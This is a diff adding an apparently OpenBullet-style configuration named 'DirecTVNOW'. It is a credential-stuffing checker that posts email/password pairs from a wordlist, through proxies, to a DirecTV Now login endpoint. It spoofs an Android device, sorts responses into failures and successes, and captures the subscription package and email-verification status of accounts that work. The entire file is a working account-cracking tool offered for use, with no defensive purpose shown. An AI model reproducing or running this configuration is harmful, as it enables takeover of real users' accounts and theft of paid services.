@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "DirecTVNOW",
+  "SuggestedBots": 5,
+  "LastModified": "2018-06-16T03:48:30.6736957+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://aeg-umsgw.quickplay.com/qp/ums/v1/login" AutoRedirect=TRUE 
+  CONTENT "{\"lDevice\":{\"deviceId\":\"497fcf854db46c5\",\"name\":\"samsung\",\"type\":\"androidmobile\"},\"password\":\"<PASS>\",\"userName\":\"<USER>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.4.1" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Please enter your password" 
+    KEY "Have we met?" 
+    KEY "Authentication failed" 
+    KEY "nextBillingAmount\":\"0" 
+    KEY "This account was locked for your security" 
+    KEY "Looks like you haven't yet signed up for DIRECTV NOW" 
+    KEY "Something went wrong" 
+    KEY "Looks like you're signing in with a temporary password" 
+  KEYCHAIN Success OR 
+    KEY "subscriptions" 
+    KEY "entitlements" 
+PARSE "<SOURCE>" JSON "emailVerified" Recursive=FALSE -> CAP "EmailVerified" "" "" 
+PARSE "<SOURCE>" JSON "subscriptions" Recursive=FALSE -> CAP "PACKAGE" "" "" 
